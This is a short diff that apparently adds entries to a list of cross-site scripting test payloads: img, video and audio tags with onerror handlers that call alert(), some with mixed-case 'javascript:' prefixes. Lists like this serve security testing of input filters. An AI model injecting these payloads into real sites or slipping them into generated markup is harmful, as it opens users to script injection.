@@ -19,6 +19,13 @@
 
 <img src=x onerror=jAvaScRipt:alert('xsspayload')>
 <IMG SRC=x onerror=jAvaScRipt:alert('xsspayload')>
+<img src=x onerror=alert(123)>
 <img src="x" onerror=javascript:alert(123)>
 ><img src="x" onerror=javascript:alert(123)>
 '"`>xsspayload<img src="x" onerror=javascript:alert(123)>
+
+<video src=x onerror=javascript:alert(123)>
+<video src=x onerror=alert(123)>
+
+<audio src=x onerror=javascript:alert(123)>
+<audio src=x onerror=alert(123)>
